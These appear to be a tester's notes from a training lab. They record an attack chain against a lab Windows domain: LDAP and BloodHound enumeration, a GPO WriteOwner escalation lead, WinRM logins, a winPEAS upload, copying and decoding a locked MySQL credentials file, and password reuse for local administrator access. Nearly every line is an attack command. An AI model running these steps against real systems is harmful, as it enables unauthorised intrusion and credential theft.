nxc ldap 192.168.x.97 -u ericwallow -p 'ericwapasswd'
	==> How to confirm that user have directory read on domain controller?

bloodhound-python -c all -dns-tcp --dns-timeout 20 -dc dc01.secura.yzx -u 'eric.wallow' -p 'ericWpasswd' -d secura.yzx -v -ns 192.168.x.97

	==> Bloodhound graph surfaced a key lead: charlotte is WriteOwner on the Default Domain Policy (DDP) GPO. If we later obtain charlotte, this control lets us push code via GPO to domain-joined systems --> including the DC. Captured the visual to keep the escalation path anchored to tangible evidence.

cat (asterik)user(asterik) |  jq -r '.data[].Properties.samaccountname' > ../domainusers

nxc winrm 192.168.x.96 -u apache -p 'New2Era4.!' --local-auth

winrm -i 192.168.x.96 -u apache -p 'New2Era4.!' --local-auth
	whoami; ipconfig; type local.txt

upload ../../../../../../../../../../../winPEASany_ofs.exe

cd C:\xampp\mysql\data\creds
	ls
	 download creds.ibd 
		 ==> had issues downloading since the MySQL process locked the file and alternative of trying powershell raw-read to Base64 didn't work either.

	copy creds.ibd backup.ibd
	download backup.ibd

#"Use External Converter" https://sqlizer.io/
	==> 2 cleared passwords: 
				Game20n4.!
				 Almost4There8.?


cat (star).sql
	==> after getting the converted .sql from sqlizer.io


nxc smb 192.168.x.96 -u administrator -p 'Almost4There8.?' --local-auth

evil-winrm -i 192.168.x.96 -u administrator -p 'Almost4There8.?'

type C:\Users\Administrator\Desktop\proof.txt



